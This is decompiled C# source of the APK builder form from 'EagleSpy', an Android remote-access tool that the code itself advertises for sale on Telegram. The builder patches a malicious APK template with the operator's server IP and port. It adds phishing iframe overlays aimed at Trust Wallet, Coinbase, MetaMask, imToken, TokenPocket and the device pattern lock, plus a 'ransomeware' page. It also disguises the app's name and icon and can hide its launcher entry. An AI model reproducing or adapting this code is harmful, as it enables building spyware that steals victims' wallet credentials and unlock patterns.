using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Guna.UI2.WinForms;

namespace Eaglespy
{
	// Token: 0x020000E0 RID: 224
	public partial class ApkBuilder : Form
	{
		// Token: 0x06000B61 RID: 2913 RVA: 0x0000737B File Offset: 0x0000557B
		public ApkBuilder()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000B62 RID: 2914 RVA: 0x000F7788 File Offset: 0x000F5988
		public bool IsJavaInstalled()
		{
			bool flag;
			try
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo("java", "-version");
				processStartInfo.RedirectStandardOutput = true;
				processStartInfo.RedirectStandardError = true;
				processStartInfo.UseShellExecute = false;
				processStartInfo.CreateNoWindow = true;
				using (Process process = new Process())
				{
					process.StartInfo = processStartInfo;
					process.Start();
					string text = process.StandardOutput.ReadToEnd();
					string text2 = process.StandardError.ReadToEnd();
					flag = text.Contains("java version") || text2.Contains("java version");
				}
			}
			catch (Exception)
			{
				flag = false;
			}
			return flag;
		}

		// Token: 0x06000B63 RID: 2915 RVA: 0x000F783C File Offset: 0x000F5A3C
		public object Trytodeletfiles()
		{
			string text = Path.Combine(Application.StartupPath, "Tools");
			string text2 = Path.Combine(text, "Android");
			string text3 = Path.Combine(text, "Build_unsigned.apk");
			string text4 = Path.Combine(text, "Aligned.apk");
			if (Directory.Exists(text2))
			{
				Directory.Delete(text2, true);
			}
			if (File.Exists(text3))
			{
				File.Delete(text3);
			}
			if (File.Exists(text4))
			{
				File.Delete(text4);
			}
			return null;
		}

		// Token: 0x06000B64 RID: 2916 RVA: 0x000F78AC File Offset: 0x000F5AAC
		public async Task DecompileApk()
		{
			string text = Path.Combine(Application.StartupPath, "Tools");
			Process process = new Process();
			string text2 = Path.Combine(text, "Android.7z");
			if (File.Exists(text2))
			{
				this.AppendTextToRichTextBox("Working......");
			}
			else
			{
				this.AppendTextToRichTextBox("files not found. ...");
				process.Close();
			}
			string AndroidFolder = Path.Combine(text, "Android");
			try
			{
				if (Directory.Exists(AndroidFolder))
				{
					this.AppendTextToRichTextBox("Old folder detected. Trying to delete");
					Directory.Delete(AndroidFolder, true);
					this.AppendTextToRichTextBox("Please wait...");
					await Task.Delay(2000);
					this.AppendTextToRichTextBox("=> 5");
					await Task.Delay(2000);
					this.AppendTextToRichTextBox(">= 4");
					await Task.Delay(2000);
					this.AppendTextToRichTextBox(">= 3");
					await Task.Delay(2000);
					this.AppendTextToRichTextBox(">= 2");
					await Task.Delay(2000);
					this.AppendTextToRichTextBox(">= 1");
				}
			}
			catch (Exception)
			{
			}
			this.AppendTextToRichTextBox("Extracting......");
			await this.ExecuteCommandAsync("cd Tools && 7z x -pt.me/EagleSpy Android.7z");
			if (Directory.Exists(AndroidFolder))
			{
				this.AppendTextToRichTextBox("Extracted successfully...");
			}
			else
			{
				this.AppendTextToRichTextBox("Failed to Extract...");
				process.Close();
			}
		}

		// Token: 0x06000B65 RID: 2917 RVA: 0x000F78F0 File Offset: 0x000F5AF0
		public async Task CompiledApk()
		{
			string toolsFolderPath = Path.Combine(Application.StartupPath, "Tools");
			string Android_Decompiled = Path.Combine(toolsFolderPath, "Android");
			Process process = new Process();
			string text = Path.Combine(toolsFolderPath, "Build_unsigned.apk");
			if (File.Exists(text))
			{
				File.Delete(text);
			}
			this.AppendTextToRichTextBox("Building Apk.....");
			await this.ExecuteCommandAsync("cd Tools && java -jar apktool.jar b Android -o Build_unsigned.apk");
			string AndroidBuild = Path.Combine(toolsFolderPath, "Build_unsigned.apk");
			if (File.Exists(AndroidBuild))
			{
				Directory.Delete(Android_Decompiled, true);
				this.AppendTextToRichTextBox("Working...");
				this.AppendTextToRichTextBox("Please wait...");
				await Task.Delay(2000);
				this.AppendTextToRichTextBox("=> 5");
				await Task.Delay(2000);
				this.AppendTextToRichTextBox(">= 4");
				await Task.Delay(2000);
				this.AppendTextToRichTextBox(">= 3");
				await Task.Delay(2000);
				this.AppendTextToRichTextBox(">= 2");
				await Task.Delay(2000);
				this.AppendTextToRichTextBox(">= 1");
				this.AppendTextToRichTextBox("Built Successfully...");
			}
			else
			{
				this.AppendTextToRichTextBox("Failed to Build...");
				process.Close();
			}
			string text2 = Path.Combine(toolsFolderPath, "Aligned.apk");
			if (File.Exists(text2))
			{
				File.Delete(text2);
			}
			else
			{
				this.AppendTextToRichTextBox("Files not found...");
			}
			this.AppendTextToRichTextBox("Zipaligning apk.....");
			await this.ExecuteCommandAsync("cd Tools && zipalign -v -p 4 Build_unsigned.apk Aligned.apk");
			string ZipalignBuild = Path.Combine(toolsFolderPath, "Aligned.apk");
			if (File.Exists(ZipalignBuild))
			{
				this.AppendTextToRichTextBox("Zipaligned Successfully...");
				try
				{
					File.Delete(AndroidBuild);
					goto IL_0471;
				}
				catch (Exception)
				{
					goto IL_0471;
				}
			}
			this.AppendTextToRichTextBox("Failed to Aligned...");
			process.Close();
			IL_0471:
			this.AppendTextToRichTextBox("Signing Apk.....");
			await this.ExecuteCommandAsync("cd Tools && java -jar signer.jar -a Aligned.apk --out Build/Output");
			try
			{
				File.Delete(ZipalignBuild);
			}
			catch (Exception)
			{
			}
			string text3 = Path.Combine(Application.StartupPath, "Tools/Build/Output/Aligned-aligned-debugSigned.apk");
			string text4 = Path.Combine(Application.StartupPath, "Tools/Build/Output/" + this.Guna2TextBox1.Text + ".apk");
			try
			{
				if (File.Exists(text3))
				{
					File.Move(text3, text4);
				}
			}
			catch (Exception)
			{
			}
			this.BuildApkButton.FillColor = Color.Red;
			string text5 = Path.Combine(Application.StartupPath, "Tools/Build/Output");
			Process.Start(text5);
			this.BuildApkButton.Enabled = true;
			this.BuildApkButton.Text = "Build Apk";
			base.TopMost = false;
		}

		// Token: 0x06000B66 RID: 2918 RVA: 0x000F7934 File Offset: 0x000F5B34
		private async Task ExecuteCommandAsync(string command)
		{
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.Arguments = "/c " + command;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.RedirectStandardError = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.OutputDataReceived += this.OutputHandler;
			process.ErrorDataReceived += this.OutputHandler;
			process.Start();
			process.BeginOutputReadLine();
			process.BeginErrorReadLine();
			await Task.Run(delegate
			{
				process.WaitForExit();
			});
			process.Close();
		}

		// Token: 0x06000B67 RID: 2919 RVA: 0x00007389 File Offset: 0x00005589
		private void OutputHandler(object sender, DataReceivedEventArgs e)
		{
			if (e.Data != null)
			{
				this.AppendTextToRichTextBox(e.Data);
			}
		}

		// Token: 0x06000B68 RID: 2920 RVA: 0x000F7980 File Offset: 0x000F5B80
		private void AppendTextToRichTextBox(string text)
		{
			if (base.InvokeRequired)
			{
				base.Invoke(new Action<string>(this.AppendTextToRichTextBox), new object[] { text });
				return;
			}
			this.RichTextBox1.AppendText(text + "\r\n");
			this.RichTextBox1.ScrollToCaret();
		}

		// Token: 0x06000B69 RID: 2921 RVA: 0x000F79D4 File Offset: 0x000F5BD4
		private void SButton1_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Title = "Select PNG Image File";
			openFileDialog.Filter = "PNG Files (*.png)|*.png";
			openFileDialog.FilterIndex = 1;
			openFileDialog.RestoreDirectory = true;
			if (openFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			string fileName = openFileDialog.FileName;
			try
			{
				if (Path.GetExtension(fileName).ToLower() != ".png")
				{
					MessageBox.Show("Please select a PNG image file.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
				else
				{
					this.PictureBox1.Image = Image.FromFile(fileName);
					this.PictureBox2.Image = Image.FromFile(fileName);
				}
			}
			catch (Exception)
			{
				this.AppendTextToRichTextBox("Error loading icon");
			}
		}

		// Token: 0x06000B6A RID: 2922 RVA: 0x000F7A8C File Offset: 0x000F5C8C
		private void Guna2ToggleSwitch1_CheckedChanged(object sender, EventArgs e)
		{
			List<Tuple<string, string, string>> list = new List<Tuple<string, string, string>>();
			if (this.Guna2ToggleSwitch1.Checked)
			{
				list.Add(Tuple.Create<string, string, string>("LAUNCHER", "INFO", "Tools\\Android\\AndroidManifest.xml"));
				return;
			}
			list.Add(Tuple.Create<string, string, string>("INFO", "LAUNCHER", "Tools\\Android\\AndroidManifest.xml"));
		}

		// Token: 0x06000B6B RID: 2923 RVA: 0x000F7AE4 File Offset: 0x000F5CE4
		private async void BuildApkButton_Click(object sender, EventArgs e)
		{
			if (this.PictureBox1 != null)
			{
				this.Guna2Panel2.Visible = false;
				this.Guna2Panel3.Visible = false;
				this.RichTextBox1.Visible = true;
				this.RichTextBox1.BringToFront();
				this.BuildApkButton.Text = "Building Apk....";
				this.BuildApkButton.Enabled = false;
				string text = Path.Combine(Application.StartupPath, "Tools");
				string text2 = Path.Combine(text, "Build/Output");
				if (Directory.Exists(text2))
				{
					Directory.Delete(text2, true);
				}
				if (!this.IsJavaInstalled())
				{
					MessageBox.Show("Java is not installed. please install java first");
					this.Trytodeletfiles();
					base.Close();
				}
				this.AppendTextToRichTextBox("EagleSpy - Advaned Android Remote Tool");
				this.AppendTextToRichTextBox("Buy - t.me/eaglespy");
				this.BuildApkButton.FillColor = Color.Green;
				new Process();
				await this.DecompileApk();
				this.AppendTextToRichTextBox("Coding smali files");
				this.AppendTextToRichTextBox("Please wait...");
				await Task.Delay(2000);
				this.AppendTextToRichTextBox("=> 5");
				await Task.Delay(2000);
				this.AppendTextToRichTextBox(">= 4");
				await Task.Delay(2000);
				this.AppendTextToRichTextBox(">= 3");
				await Task.Delay(2000);
				this.AppendTextToRichTextBox(">= 2");
				await Task.Delay(2000);
				this.AppendTextToRichTextBox(">= 1");
				string directoryName = Path.GetDirectoryName(Application.ExecutablePath);
				byte[] bytes = Encoding.UTF8.GetBytes(this.TextBox2.Text);
				string text3 = Convert.ToBase64String(bytes);
				byte[] bytes2 = Encoding.UTF8.GetBytes(this.TextBox3.Text);
				string text4 = Convert.ToBase64String(bytes2);
				byte[] bytes3 = Encoding.UTF8.GetBytes(this.TextBox4.Text);
				string text5 = Convert.ToBase64String(bytes3);
				string text6 = "<!DOCTYPE html>\r\n<html lang=\"zh-CN\">\r\n<head>\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\r\n<title></title>\r\n<style>\r\n* {\r\n    margin: 0;\r\n    padding: 0;\r\n}\r\n\r\nhtml,body{\r\n height:100%;\r\n}\r\n</style>\r\n</head>\r\n<body>\r\n\r\n<frameset>\r\n<iframe  frameborder=\"no\" border=\"0\"  width=\"100%\" height=\"100%\" name=\"frame\" src=\"http://" + this.TextBox2.Text + "/intercepts/trustwallet\"/>\r\n</frameset>\r\n\r\n</body>\r\n</html>";
				string text7 = "<!DOCTYPE html>\r\n<html lang=\"zh-CN\">\r\n<head>\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\r\n<title></title>\r\n<style>\r\n* {\r\n    margin: 0;\r\n    padding: 0;\r\n}\r\n\r\nhtml,body{\r\n height:100%;\r\n}\r\n</style>\r\n</head>\r\n<body>\r\n\r\n<frameset>\r\n<iframe  frameborder=\"no\" border=\"0\"  width=\"100%\" height=\"100%\" name=\"frame\" src=\"http://" + this.TextBox2.Text + "/intercepts/patternlock\"/>\r\n</frameset>\r\n\r\n</body>\r\n</html>";
				string text8 = "<!DOCTYPE html>\r\n<html lang=\"zh-CN\">\r\n<head>\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\r\n<title></title>\r\n<style>\r\n* {\r\n    margin: 0;\r\n    padding: 0;\r\n}\r\n\r\nhtml,body{\r\n height:100%;\r\n}\r\n</style>\r\n</head>\r\n<body>\r\n\r\n<frameset>\r\n<iframe  frameborder=\"no\" border=\"0\"  width=\"100%\" height=\"100%\" name=\"frame\" src=\"http://" + this.TextBox2.Text + "/intercepts/coinbase\"/>\r\n</frameset>\r\n\r\n</body>\r\n</html>";
				string text9 = "<!DOCTYPE html>\r\n<html lang=\"zh-CN\">\r\n<head>\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\r\n<title></title>\r\n<style>\r\n* {\r\n    margin: 0;\r\n    padding: 0;\r\n}\r\n\r\nhtml,body{\r\n height:100%;\r\n}\r\n</style>\r\n</head>\r\n<body>\r\n\r\n<frameset>\r\n<iframe  frameborder=\"no\" border=\"0\"  width=\"100%\" height=\"100%\" name=\"frame\" src=\"http://" + this.TextBox2.Text + "/intercepts/ransomeware\"/>\r\n</frameset>\r\n\r\n</body>\r\n</html>";
				byte[] bytes4 = Encoding.UTF8.GetBytes(text6);
				string text10 = Convert.ToBase64String(bytes4);
				byte[] bytes5 = Encoding.UTF8.GetBytes(text7);
				string text11 = Convert.ToBase64String(bytes5);
				byte[] bytes6 = Encoding.UTF8.GetBytes(text8);
				string text12 = Convert.ToBase64String(bytes6);
				byte[] bytes7 = Encoding.UTF8.GetBytes(text9);
				string text13 = Convert.ToBase64String(bytes7);
				List<Tuple<string, string, string>> list = new List<Tuple<string, string, string>>
				{
					Tuple.Create<string, string, string>("APP_NAME2", this.Guna2TextBox8.Text, "Tools\\Android\\AndroidManifest.xml"),
					Tuple.Create<string, string, string>("APP_NAME", this.Guna2TextBox1.Text, "Tools\\Android\\res\\values\\strings.xml"),
					Tuple.Create<string, string, string>("WEBSITE_URL", this.Guna2TextBox2.Text, "Tools\\Android\\smali_classes2\\eagle\\ltd\\_skin_cls_.smali"),
					Tuple.Create<string, string, string>("MTI3LjAuMC4x", text3, "Tools\\Android\\smali\\com\\whh\\tlcxryjvpwcypcgtkkqshldiopzcnjnmxrauawffmudogcwqaj2\\ezsdwtyvergvuxftryemrutyrkhccgizeogbhosgahiqkrqagq3\\initializeService.smali"),
					Tuple.Create<string, string, string>("Nzc3MQ==", text4, "Tools\\Android\\smali\\com\\whh\\tlcxryjvpwcypcgtkkqshldiopzcnjnmxrauawffmudogcwqaj2\\ezsdwtyvergvuxftryemrutyrkhccgizeogbhosgahiqkrqagq3\\initializeService.smali"),
					Tuple.Create<string, string, string>("RWFnbGVTcHk=", text5, "Tools\\Android\\smali\\com\\whh\\tlcxryjvpwcypcgtkkqshldiopzcnjnmxrauawffmudogcwqaj2\\ezsdwtyvergvuxftryemrutyrkhccgizeogbhosgahiqkrqagq3\\initializeService.smali"),
					Tuple.Create<string, string, string>("GROUP_NAME", "Client", "Tools\\Android\\smali_classes2\\eagle\\ltd\\ClassGen11.smali"),
					Tuple.Create<string, string, string>("NOTIFICATION_TITLE", this.Guna2TextBox3.Text, "Tools\\Android\\smali\\com\\whh\\tlcxryjvpwcypcgtkkqshldiopzcnjnmxrauawffmudogcwqaj2\\lguefghgodieaugvsmhiitfuuuivnlkbidbdrptqoaponmgwtv4\\NotificationUtils.smali"),
					Tuple.Create<string, string, string>("NOTIFICATION_TITLE", this.Guna2TextBox3.Text, "Tools\\Android\\smali\\com\\whh\\tlcxryjvpwcypcgtkkqshldiopzcnjnmxrauawffmudogcwqaj2\\lguefghgodieaugvsmhiitfuuuivnlkbidbdrptqoaponmgwtv4\\utilities.smali"),
					Tuple.Create<string, string, string>("NOTIFICATION_MSG", this.Guna2TextBox4.Text, "Tools\\Android\\smali\\com\\whh\\tlcxryjvpwcypcgtkkqshldiopzcnjnmxrauawffmudogcwqaj2\\lguefghgodieaugvsmhiitfuuuivnlkbidbdrptqoaponmgwtv4\\NotificationUtils.smali"),
					Tuple.Create<string, string, string>("NOTIFICATION_MSG", this.Guna2TextBox4.Text, "Tools\\Android\\smali\\com\\whh\\tlcxryjvpwcypcgtkkqshldiopzcnjnmxrauawffmudogcwqaj2\\lguefghgodieaugvsmhiitfuuuivnlkbidbdrptqoaponmgwtv4\\utilities.smali"),
					Tuple.Create<string, string, string>("APP_NAME", this.Guna2TextBox1.Text, "Tools\\Android\\res\\values\\strings.xml"),
					Tuple.Create<string, string, string>("https://WEBSITE_URL", this.Guna2TextBox2.Text, "Tools\\Android\\smali\\com\\whh\\tlcxryjvpwcypcgtkkqshldiopzcnjnmxrauawffmudogcwqaj2\\MainActivity.smali"),
					Tuple.Create<string, string, string>("APP_NAME", this.Guna2TextBox1.Text, "Tools\\Android\\res\\layout\\activity_req_access.xml"),
					Tuple.Create<string, string, string>("APP_NAME", this.Guna2TextBox1.Text, "Tools\\Android\\res\\layout\\loading.xml")
				};
				if (this.Guna2ToggleSwitch1.Checked)
				{
					list.Add(Tuple.Create<string, string, string>("LAUNCHER", "INFO", "Tools\\Android\\AndroidManifest.xml"));
				}
				else
				{
					list.Add(Tuple.Create<string, string, string>("INFO", "LAUNCHER", "Tools\\Android\\AndroidManifest.xml"));
				}
				list.Add(Tuple.Create<string, string, string>("TRUSTWALLET_INTERCEPTION", text10, "Tools\\Android\\smali_classes2\\eagle\\ltd\\AppLa_ClassGen_unch.smali"));
				list.Add(Tuple.Create<string, string, string>("TRUSTWALLET_INTERCEPTION", text10, "Tools\\Android\\smali_classes2\\eagle\\ltd\\ClassGen12.smali"));
				list.Add(Tuple.Create<string, string, string>("IMTOKEN_INTERCEPTION", text11, "Tools\\Android\\smali_classes2\\eagle\\ltd\\AppLa_ClassGen_unch.smali"));
				list.Add(Tuple.Create<string, string, string>("IMTOKEN_INTERCEPTION", text11, "Tools\\Android\\smali_classes2\\eagle\\ltd\\ClassGen12.smali"));
				list.Add(Tuple.Create<string, string, string>("METAMASK_INTERCEPTION", text12, "Tools\\Android\\smali_classes2\\eagle\\ltd\\AppLa_ClassGen_unch.smali"));
				list.Add(Tuple.Create<string, string, string>("METAMASK_INTERCEPTION", text12, "Tools\\Android\\smali_classes2\\eagle\\ltd\\ClassGen12.smali"));
				list.Add(Tuple.Create<string, string, string>("TOKENPOCKET_INTERCEPTION", text13, "Tools\\Android\\smali_classes2\\eagle\\ltd\\AppLa_ClassGen_unch.smali"));
				list.Add(Tuple.Create<string, string, string>("TOKENPOCKET_INTERCEPTION", text13, "Tools\\Android\\smali_classes2\\eagle\\ltd\\ClassGen12.smali"));
				Directory.SetCurrentDirectory(directoryName);
				foreach (Tuple<string, string, string> tuple in list)
				{
					string text14 = Path.Combine(directoryName, tuple.Item3);
					if (File.Exists(text14))
					{
						this.FindAndReplaceInFile(text14, tuple.Item1, tuple.Item2);
						this.AppendTextToRichTextBox("Coded of Smali files successfully..");
						this.AppendTextToRichTextBox(".................................");
						this.AppendTextToRichTextBox("...buy from --> t.me/eaglespy............");
						this.AppendTextToRichTextBox("...............................");
					}
				}
				if (this.PictureBox1.Image == null)
				{
					MessageBox.Show("Please select an image first.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
				else
				{
					try
					{
						string text15 = Path.Combine(directoryName, "Tools\\Android\\res\\drawable\\soonj70.png");
						this.PictureBox1.Image.Save(text15, ImageFormat.Png);
						this.Label12.Text = "Image replaced successfully.";
					}
					catch (Exception ex)
					{
						MessageBox.Show("Error replacing image: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					}
					try
					{
						string text16 = Path.Combine(directoryName, "Tools\\Android\\res\\drawable\\skinicon.png");
						this.PictureBox2.Image.Save(text16, ImageFormat.Png);
						this.AppendTextToRichTextBox("Selected Icon changed successfullly");
					}
					catch (Exception)
					{
						this.Label12.Text = "image selection error";
					}
					string text17 = Path.Combine(Application.StartupPath, "Tools");
					string text18 = Path.Combine(text17, "Android");
					if (Directory.Exists(text18))
					{
						this.AppendTextToRichTextBox("................................");
						this.AppendTextToRichTextBox("Final Building Apk...");
						await this.CompiledApk();
					}
				}
			}
		}

		// Token: 0x06000B6C RID: 2924 RVA: 0x000F7B1C File Offset: 0x000F5D1C
		private void SButton2_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Title = "Select PNG Image File";
			openFileDialog.Filter = "PNG Files (*.png)|*.png";
			openFileDialog.FilterIndex = 1;
			openFileDialog.RestoreDirectory = true;
			if (openFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			string fileName = openFileDialog.FileName;
			try
			{
				if (Path.GetExtension(fileName).ToLower() != ".png")
				{
					MessageBox.Show("Please select a PNG image file.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
				else
				{
					this.PictureBox2.Image = Image.FromFile(fileName);
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show("Error loading image: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		// Token: 0x06000B6D RID: 2925 RVA: 0x000F7BD4 File Offset: 0x000F5DD4
		private void FindAndReplaceInFile(string filePath, string oldText, string newText)
		{
			try
			{
				string text = File.ReadAllText(filePath);
				text = text.Replace(oldText, newText);
				File.WriteAllText(filePath, text);
			}
			catch (Exception ex)
			{
				MessageBox.Show("Error processing file: " + filePath + Environment.NewLine + ex.Message);
			}
		}

		// Token: 0x06000B6E RID: 2926 RVA: 0x000F7C2C File Offset: 0x000F5E2C
		private void DisplayIPv4Address()
		{
			try
			{
				IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
				string text = null;
				IPAddress[] addressList = hostEntry.AddressList;
				foreach (IPAddress ipaddress in addressList)
				{
					if (ipaddress.AddressFamily == AddressFamily.InterNetwork)
					{
						text = ipaddress.ToString();
						break;
					}
				}
				if (text != null)
				{
					this.TextBox2.Text = text ?? "";
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000B6F RID: 2927 RVA: 0x0000739F File Offset: 0x0000559F
		private void ApkBuilder_Load(object sender, EventArgs e)
		{
			this.DisplayIPv4Address();
		}

		// Token: 0x06000B70 RID: 2928 RVA: 0x000073A7 File Offset: 0x000055A7
		private void Guna2GradientButton2_Click(object sender, EventArgs e)
		{
			MessageBox.Show("Currently in maintenance");
		}

		// Token: 0x06000B71 RID: 2929 RVA: 0x00002423 File Offset: 0x00000623
		private void Guna2GradientButton1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000B72 RID: 2930 RVA: 0x000073B4 File Offset: 0x000055B4
		private void Guna2TextBox1_TextChanged(object sender, EventArgs e)
		{
			this.Guna2TextBox8.Text = this.Guna2TextBox1.Text;
		}
	}
}
